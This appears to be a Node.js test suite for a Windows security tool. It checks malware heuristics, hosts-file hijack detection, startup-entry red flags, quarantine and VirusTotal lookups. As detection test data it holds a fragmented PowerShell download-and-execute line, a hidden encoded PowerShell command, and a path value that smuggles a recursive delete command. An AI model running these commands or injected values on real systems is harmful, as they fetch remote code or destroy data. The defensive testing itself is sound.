'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const { nameHits, contentPlan, contentHits, parseZone, severityOf } = require('../src/main/workers/heuristics');
const { EICAR } = require('../src/main/workers/rules');
const { parseHosts, hostsFindings, removeHostsLines } = require('../src/main/security/analyze/hosts');
const { classifyIp, commandTarget, commandRedFlags, pathKind } = require('../src/main/security/analyze/common');
const { matchRemoteTool } = require('../src/main/security/analyze/network');
const { snapshot, diffSnapshots } = require('../src/main/security/guard');
const { Quarantine } = require('../src/main/security/quarantine');
const { lookup, parseReport } = require('../src/main/security/virustotal');
const { buildScript } = require('../src/main/security/runner');
const { SecurityService } = require('../src/main/security/service');
const { analyzeAutoruns } = require('../src/main/security/analyze/autoruns');

const PS_DIR = path.join(__dirname, '..', 'src', 'main', 'security', 'ps');
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'opk-sec-'));
const decode = (b64) => Buffer.from(b64, 'base64').toString('utf8');
const ids = (hits) => hits.map((h) => h.id);

// ------------------------------------------------------------ heuristics ---

test('flags programs pretending to be documents', () => {
  assert.deepEqual(ids(nameHits('C:\\Users\\bob\\Downloads\\Invoice.pdf.exe')), ['double-ext']);
  assert.deepEqual(ids(nameHits('C:\\Users\\bob\\Downloads\\holiday photo        .exe')), ['padded-ext']);
  assert.deepEqual(ids(nameHits('C:\\Users\\bob\\Downloads\\report\u202eFDP.exe')), ['rtlo']);
  assert.deepEqual(nameHits('C:\\Users\\bob\\Downloads\\setup.exe'), []);
  assert.deepEqual(nameHits('C:\\Users\\bob\\Documents\\notes.v2.txt'), []);
});

test('flags Windows system names outside the Windows folder only', () => {
  assert.deepEqual(ids(nameHits('C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\svchost.exe')), ['fake-system']);
  assert.deepEqual(nameHits('C:\\Windows\\System32\\svchost.exe'), []);
  assert.deepEqual(nameHits('D:\\Windows.old\\Windows\\System32\\lsass.exe'), []);
});

test('flags programs placed in the Startup folder', () => {
  const file = 'C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.vbs';
  assert.deepEqual(ids(nameHits(file)), ['startup-file']);
  assert.deepEqual(nameHits(file.replace('helper.vbs', 'desktop.ini')), []);
});

test('detects the EICAR test file', () => {
  const eicar = Buffer.from(decode(EICAR[0]) + decode(EICAR[1]), 'latin1');
  const plan = contentPlan('C:\\Users\\bob\\Downloads\\eicar.com', eicar.length);
  assert.ok(plan.checks.includes('eicar'));
  assert.deepEqual(ids(contentHits('C:\\Users\\bob\\Downloads\\eicar.com', eicar, plan.checks)), ['eicar']);
  assert.deepEqual(contentHits('a.txt', Buffer.alloc(eicar.length, 0x41), ['eicar']), []);
});

test('detects a program disguised as a document', () => {
  const plan = contentPlan('C:\\Users\\bob\\Downloads\\invoice.pdf', 40_000);
  assert.deepEqual(plan, { checks: ['disguise'], bytes: 2 });
  assert.deepEqual(ids(contentHits('invoice.pdf', Buffer.from('MZ'), ['disguise'])), ['disguised-exe']);
  assert.deepEqual(contentHits('invoice.pdf', Buffer.from('%P'), ['disguise']), []);
});

test('detects malicious script techniques', () => {
  // Built from pieces so this test file itself doesn't look like a dropper.
  const dl = ['I', 'EX (New-Object Net.Web', 'Client).Download', 'String("http://example.invalid/a")'].join('');
  const plan = contentPlan('C:\\Users\\bob\\AppData\\Local\\Temp\\run.ps1', dl.length);
  assert.ok(plan.checks.includes('script'));
  assert.ok(ids(contentHits('run.ps1', Buffer.from(dl), plan.checks)).includes('download-exec'));

  const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(dl, 'utf16le')]);
  assert.ok(ids(contentHits('run.ps1', utf16, ['script'])).includes('download-exec'), 'UTF-16 scripts are decoded');

  const benign = 'Write-Host "Backing up your photos"\nCopy-Item $src $dst -Recurse';
  assert.deepEqual(contentHits('backup.ps1', Buffer.from(benign), ['script']), []);
});

test('detects ransom notes but not ordinary readme files', () => {
  const note = 'All your files have been encrypted. To decrypt them send bitcoin and your personal ID.';
  const plan = contentPlan('C:\\Users\\bob\\Desktop\\HOW_TO_DECRYPT.txt', note.length);
  assert.ok(plan.checks.includes('ransom'));
  assert.deepEqual(ids(contentHits('HOW_TO_DECRYPT.txt', Buffer.from(note), ['ransom'])), ['ransom-note']);
  assert.ok(!contentPlan('C:\\Users\\bob\\Desktop\\README.txt', 900).checks.includes('ransom'));
});

test('reads where a download came from and ranks severity', () => {
  assert.deepEqual(parseZone('[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://a.example/\r\nHostUrl=https://a.example/f.exe\r\n'),
    { zone: 3, url: 'https://a.example/f.exe', referrer: 'https://a.example/' });
  assert.equal(parseZone(''), null);
  assert.equal(severityOf([{ severity: 'medium' }, { severity: 'high' }]), 'danger');
  assert.equal(severityOf([{ severity: 'medium' }]), 'warning');
  assert.equal(severityOf([{ severity: 'low' }]), 'notice');
});

// ------------------------------------------------------------ hosts file ---

test('parses the hosts file and ignores comments', () => {
  const entries = parseHosts('# comment\n127.0.0.1 localhost\n\n0.0.0.0 ads.example.com tracker.example.com # ads\n');
  assert.equal(entries.length, 2);
  assert.deepEqual(entries[1].hosts, ['ads.example.com', 'tracker.example.com']);
  assert.equal(entries[1].line, 4);
});

test('flags hosts entries that block security sites or hijack popular ones', () => {
  const text = '127.0.0.1 localhost\n0.0.0.0 doubleclick.net\n127.0.0.1 update.microsoft.com\n45.12.9.1 www.paypal.com\n';
  const byId = Object.fromEntries(hostsFindings(text, 'hosts').map((f) => [f.id, f]));
  assert.equal(byId['hosts:blocked-security'].severity, 'danger');
  assert.deepEqual(byId['hosts:blocked-security'].fix.action.lines, [3]);
  assert.equal(byId['hosts:redirect'].severity, 'danger');
  assert.deepEqual(byId['hosts:redirect'].fix.action.lines, [4]);

  const clean = hostsFindings('127.0.0.1 localhost\n0.0.0.0 ads.example.com\n', 'hosts');
  assert.deepEqual(clean.map((f) => [f.id, f.severity]), [['hosts:ok', 'ok']]);
  assert.match(clean[0].summary, /1 ad or tracking address/);
});

test('removes hosts lines and keeps Windows line endings', () => {
  assert.equal(removeHostsLines('a\r\nb\r\nc\r\n', [2]), 'a\r\nc\r\n');
  assert.equal(removeHostsLines('a\nb\nc', [1, 3]), 'b');
});

// ------------------------------------------------------- command lines ---

test('classifies IP addresses', () => {
  assert.equal(classifyIp('8.8.8.8'), 'public');
  assert.equal(classifyIp('192.168.1.5'), 'private');
  assert.equal(classifyIp('10.0.0.2'), 'private');
  assert.equal(classifyIp('127.0.0.1'), 'loopback');
  assert.equal(classifyIp('::1'), 'loopback');
  assert.equal(classifyIp('0.0.0.0'), 'any');
});

test('finds the real payload behind script hosts', () => {
  const env = { USERPROFILE: 'C:\\Users\\bob', APPDATA: 'C:\\Users\\bob\\AppData\\Roaming' };
  const t = commandTarget('wscript.exe //B "%APPDATA%\\x\\run.vbs"', env);
  assert.equal(t.host, 'wscript.exe');
  assert.equal(t.file, 'C:\\Users\\bob\\AppData\\Roaming\\x\\run.vbs');
  assert.equal(commandTarget('"C:\\Program Files\\App\\app.exe" --tray', env).file, 'C:\\Program Files\\App\\app.exe');
});

test('spots hidden PowerShell in startup commands', () => {
  const flags = commandRedFlags(`powershell.exe -w hidden -nop -enc ${'QQBCAEMA'.repeat(10)}`);
  assert.ok(flags.some((f) => /encoded/.test(f)));
  assert.ok(flags.some((f) => /hidden window/.test(f)));
  assert.deepEqual(commandRedFlags('"C:\\Program Files\\Steam\\steam.exe" -silent'), []);
});

test('knows user-writable folders', () => {
  const env = { USERPROFILE: 'C:\\Users\\bob', LOCALAPPDATA: 'C:\\Users\\bob\\AppData\\Local', TEMP: 'C:\\Users\\bob\\AppData\\Local\\Temp' };
  assert.equal(pathKind('C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe', env), 'temp');
});

test('recognises remote-control tools by process name', () => {
  assert.equal(matchRemoteTool({ name: 'TeamViewer', path: 'C:\\Program Files\\TeamViewer\\TeamViewer.exe' }).name, 'TeamViewer');
  assert.equal(matchRemoteTool({ name: 'AnyDesk' }).name, 'AnyDesk');
  assert.equal(matchRemoteTool({ name: 'chrome' }), null);
});

// ----------------------------------------------------------------- guard ---

test('Guard alerts only on things that are new', () => {
  const base = {
    consent: [],
    connections: [{ localAddress: '0.0.0.0', localPort: 6881, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 900, name: 'qbittorrent' }],
    processes: [{ pid: 1, name: 'chrome' }],
    run: [{ key: 'HKCU\\Run', name: 'Steam', command: 'steam.exe -silent' }],
    startupFolder: [],
    tasks: ['\\GoogleUpdate'],
    rdpSessions: [],
    threatCount: 1,
  };
  const first = snapshot(base);
  assert.deepEqual(diffSnapshots(null, first), [], 'no alerts on the first look');
  assert.deepEqual(diffSnapshots(first, snapshot(base)), [], 'no alerts when nothing changed');

  const next = snapshot({
    ...base,
    consent: [{ cap: 'webcam', name: 'C:#Users#bob#AppData#Local#Temp#spy.exe' }],
    connections: [...base.connections, { localAddress: '192.168.1.5', localPort: 6881, remoteAddress: '89.1.2.3', remotePort: 5000, state: 'Established', pid: 900, name: 'qbittorrent' }],
    processes: [...base.processes, { pid: 2, name: 'AnyDesk' }],
    run: [...base.run, { key: 'HKCU\\Run', name: 'Updater', command: 'powershell -w hidden' }],
    rdpSessions: [{ user: 'x' }],
    threatCount: 2,
  });
  const alerts = diffSnapshots(first, next);
  const titles = alerts.map((a) => a.title);
  assert.ok(titles.includes('spy started using your camera'), titles.join(' | '));
  assert.ok(titles.includes('Incoming connection from 89.1.2.3'));
  assert.ok(titles.includes('AnyDesk just started'));
  assert.ok(titles.includes('New startup program: Updater'));
  assert.ok(titles.includes('Someone connected with Remote Desktop'));
  assert.ok(titles.includes('Microsoft Defender found a threat'));
  assert.equal(alerts.find((a) => a.title === 'AnyDesk just started').severity, 'danger');
});

test('Guard stays quiet about opKapot\'s own task and startup apps you just added', () => {
  const base = { run: [], tasks: [] };
  const first = snapshot(base);
  const next = snapshot({
    run: [{ key: 'HKCU\\Run', name: 'My Tool', command: '"C:\\Tools\\tool.exe"' }, { key: 'HKCU\\Run', name: 'Other', command: 'other.exe' }],
    tasks: ['\\opKapot Guard', '\\Sneaky'],
  });
  const titles = diffSnapshots(first, next, new Set(['HKCU\\Run|My Tool'])).map((a) => a.title);
  assert.deepEqual(titles.sort(), ['New scheduled task', 'New startup program: Other']);
});

test('opKapot\'s own startup task is recognised, and only trusted when it starts this copy', () => {
  const env = { USERPROFILE: 'C:\\Users\\Me', LOCALAPPDATA: 'C:\\Users\\Me\\AppData\\Local', APPDATA: 'C:\\Users\\Me\\AppData\\Roaming', TEMP: 'C:\\Users\\Me\\AppData\\Local\\Temp' };
  const exe = 'C:\\Users\\Me\\Documents\\opKapot\\opKapot.exe';
  const task = (file, name = 'opKapot Guard') => ({ tasks: [{ path: '\\', name, state: 'Ready', runLevel: 'Highest', user: 'Me', actions: [{ exe: file, args: '--background' }] }] });

  const [mine] = analyzeAutoruns(task(exe), { env, selfPaths: [exe.toUpperCase()] });
  assert.equal(mine.self, true);
  assert.equal(mine.name, 'opKapot');
  assert.equal(mine.risk, 'ok', 'our own task is not flagged in Hack Check');

  const [impostor] = analyzeAutoruns(task('C:\\Users\\Me\\AppData\\Local\\Temp\\x.exe'), { env, selfPaths: [exe] });
  assert.equal(impostor.self, true);
  assert.equal(impostor.risk, 'danger', 'a task using our name but starting something else is still flagged');

  const [other] = analyzeAutoruns(task(exe, 'Something else'), { env, selfPaths: [exe] });
  assert.equal(other.self, false);
});

// ------------------------------------------------------------ quarantine ---

test('quarantine scrambles files and restores them byte for byte', async () => {
  const dir = tmp();
  const q = new Quarantine(path.join(dir, 'q'));
  const file = path.join(dir, 'bad.exe');
  const content = Buffer.from('MZ\x90\x00 pretend program bytes');
  fs.writeFileSync(file, content);

  const entry = await q.add(file, { threat: 'Fake file extension' });
  assert.equal(fs.existsSync(file), false, 'original is gone');
  const stored = fs.readFileSync(path.join(dir, 'q', `${entry.id}.qtn`));
  assert.equal(stored.length, content.length);
  assert.notDeepEqual(stored, content, 'stored copy is scrambled');
  assert.notEqual(stored.subarray(0, 2).toString('latin1'), 'MZ', 'no longer starts like a program');
  assert.equal(q.list().length, 1);

  fs.writeFileSync(file, 'a new file with the same name');
  const restored = await q.restore(entry.id);
  assert.equal(restored.restoredTo, path.join(dir, 'bad (restored).exe'));
  assert.deepEqual(fs.readFileSync(restored.restoredTo), content);
  assert.equal(q.list().length, 0);
});

test('quarantine delete removes the stored copy', async () => {
  const dir = tmp();
  const q = new Quarantine(path.join(dir, 'q'));
  const file = path.join(dir, 'x.scr');
  fs.writeFileSync(file, 'x');
  const entry = await q.add(file);
  await q.remove(entry.id);
  assert.equal(fs.existsSync(path.join(dir, 'q', `${entry.id}.qtn`)), false);
  assert.deepEqual(q.list(), []);
});

// ------------------------------------------------------------ VirusTotal ---

test('parses VirusTotal reports', () => {
  const r = parseReport({ data: { attributes: { last_analysis_stats: { malicious: 50, suspicious: 2, harmless: 1, undetected: 17 }, popular_threat_classification: { suggested_threat_label: 'trojan.x' } } } });
  assert.deepEqual([r.malicious, r.suspicious, r.harmless, r.total, r.label], [50, 2, 18, 70, 'trojan.x']);
});

test('VirusTotal lookups send only the hash', async () => {
  await assert.rejects(lookup('not-a-hash', 'key'), /Invalid file hash/);
  await assert.rejects(lookup('a'.repeat(64), ''), /API key/);
  const calls = [];
  const fakeFetch = async (url, opts) => {
    calls.push({ url, opts });
    return { status: 404, ok: false };
  };
  assert.deepEqual(await lookup('b'.repeat(64), 'k'.repeat(64), fakeFetch), { found: false });
  assert.equal(calls.length, 1);
  assert.equal(calls[0].url, `https://www.virustotal.com/api/v3/files/${'b'.repeat(64)}`);
  assert.equal(calls[0].opts.body, undefined, 'nothing is uploaded');
});

// ------------------------------------------------------ PowerShell side ---

test('collector scripts are plain ASCII', () => {
  for (const f of fs.readdirSync(PS_DIR).filter((n) => n.endsWith('.ps1'))) {
    const bytes = fs.readFileSync(path.join(PS_DIR, f));
    assert.ok(bytes.every((b) => b < 0x80), `${f} contains non-ASCII bytes`);
  }
});

test('collector scripts never reuse the names $r or $p', () => {
  // PowerShell variable names ignore case: $r would overwrite the $R results and $p the $P parameters.
  for (const f of fs.readdirSync(PS_DIR).filter((n) => n.endsWith('.ps1'))) {
    const text = fs.readFileSync(path.join(PS_DIR, f), 'utf8');
    assert.doesNotMatch(text, /\$[rp]\b(?![\[.])|\$r\.|\$p\./, `${f} uses $r or $p`);
  }
});

test('script parameters are passed as base64 JSON, never pasted into code', () => {
  const script = buildScript('status', { path: "C:\\x'; Remove-Item C:\\ -Recurse; '" });
  assert.ok(!script.includes('Remove-Item C:\\'));
  assert.match(script, /FromBase64String\('[A-Za-z0-9+/=]+'\)\) \| ConvertFrom-Json/);
});

const pwsh = process.env.OPKAPOT_POWERSHELL || (spawnSync('pwsh', ['-v']).status === 0 ? 'pwsh' : null);

test('collector scripts parse without errors', { skip: !pwsh && 'PowerShell 7 (pwsh) not found' }, () => {
  const check = `$bad = 0; Get-ChildItem '${PS_DIR}' -Filter *.ps1 | ForEach-Object { $t = $null; $e = $null; [void][System.Management.Automation.Language.Parser]::ParseFile($_.FullName, [ref]$t, [ref]$e); foreach ($x in $e) { $bad++; Write-Output "$($_.Name): $($x.Message)" } }; exit $bad`;
  const res = spawnSync(pwsh, ['-NoProfile', '-NonInteractive', '-Command', check], { encoding: 'utf8' });
  assert.equal(res.status, 0, res.stdout + res.stderr);
});

test('collectors return JSON even where Windows features are missing', { skip: !pwsh && 'PowerShell 7 (pwsh) not found' }, async () => {
  process.env.OPKAPOT_POWERSHELL = pwsh;
  const { runPs } = require('../src/main/security/runner');
  const status = await runPs('status', {}, { timeout: 60_000 });
  assert.equal(typeof status, 'object');
  assert.ok('defender' in status, Object.keys(status).join(','));
});

// ------------------------------------------------------- whole pipeline ---

test('demo PC: Hack Check, network, startup, privacy and scan all agree', async () => {
  const dir = tmp();
  const svc = new SecurityService({
    demo: true, userDataDir: dir, backupDir: dir, trash: async () => {}, addHistory: () => {},
    getSettings: () => ({ guardEnabled: false, guardIntervalSec: 30 }),
  });
  const audit = await svc.audit();
  assert.ok(audit.summary.counts.danger >= 3);
  const byId = (prefix) => audit.findings.find((f) => f.id.startsWith(prefix));
  assert.equal(byId('av:exclusion').severity, 'danger', 'Defender exclusion on AppData is dangerous');
  assert.equal(byId('autorun:run|').severity, 'danger', 'hidden PowerShell run key is dangerous');
  assert.ok(audit.findings.every((f) => f.title && f.category && ['danger', 'warning', 'notice', 'ok'].includes(f.severity)));

  const status = await svc.status();
  assert.equal(status.overall, 'danger');
  assert.ok(status.remoteTools.includes('TeamViewer'));

  const net = await svc.network();
  assert.ok(net.rows.some((r) => r.direction === 'in' && r.remoteKind === 'public'));
  const autoruns = await svc.autoruns();
  assert.ok(autoruns.some((e) => e.name === 'WindowsHelper' && e.risk === 'danger'));
  const privacy = await svc.privacy();
  assert.ok(privacy.some((r) => r.inUse && r.name === 'Discord'));

  const scan = await svc.scan({ jobId: 't', type: 'quick' }, () => {});
  assert.ok(scan.rows.length >= 2);
  assert.ok(scan.rows.every((r) => r.id && r.engine && r.severity));
});

test('demo PC: Startup Manager adds, switches off and removes startup apps', async () => {
  const dir = tmp();
  const history = [];
  const svc = new SecurityService({
    demo: true, userDataDir: dir, backupDir: dir, trash: async () => {}, addHistory: (h) => history.push(h),
    getSettings: () => ({ guardEnabled: false, guardIntervalSec: 30 }),
  });
  const program = path.join(dir, 'tool.exe');
  fs.writeFileSync(program, 'MZ');
  const before = await svc.autoruns();

  await assert.rejects(svc.autorunAdd({ path: 'relative\\tool.exe', name: 'Tool' }), /program on this PC/);
  await assert.rejects(svc.autorunAdd({ path: path.join(dir, 'missing.exe'), name: 'Tool' }), /doesn't exist/);
  await assert.rejects(svc.autorunAdd({ path: program, name: '' }), /name/);
  await assert.rejects(svc.autorunAdd({ path: program, name: 'a\\b' }), /backslash/);
  await assert.rejects(svc.autorunAdd({ path: program, name: 'Tool', args: 'a\nb' }), /one line/);
  assert.equal((await svc.autorunAdd({ path: program, name: 'steam' })).ok, false, 'names already in use are refused');

  const added = await svc.autorunAdd({ path: program, name: 'My Tool', args: '--minimized' });
  assert.equal(added.ok, true);
  assert.ok(svc.guard.expected.has('HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|My Tool'), 'the Guard expects it');
  let list = await svc.autoruns();
  const mine = list.find((e) => e.name === 'My Tool');
  assert.equal(list.length, before.length + 1);
  assert.equal(mine.command, `"${program}" --minimized`);
  assert.equal(mine.enabled, true);
  assert.ok(mine.canDisable && mine.canRemove);

  assert.equal((await svc.autorunAction(mine.id, 'disable')).ok, true);
  assert.equal((await svc.autoruns()).find((e) => e.id === mine.id).enabled, false);
  assert.equal((await svc.autorunAction(mine.id, 'remove')).ok, true);
  list = await svc.autoruns();
  assert.equal(list.length, before.length);
  assert.ok(!list.some((e) => e.id === mine.id));

  assert.equal((await svc.autorunAdd({ path: program, name: 'My Tool' })).ok, true, 'a removed name can be used again');
  assert.equal((await svc.autoruns()).find((e) => e.name === 'My Tool').enabled, true, 'and starts enabled');
  assert.deepEqual(history.map((h) => h.title), ['Added startup item', 'Disabled startup item', 'Removed startup item', 'Added startup item']);
});
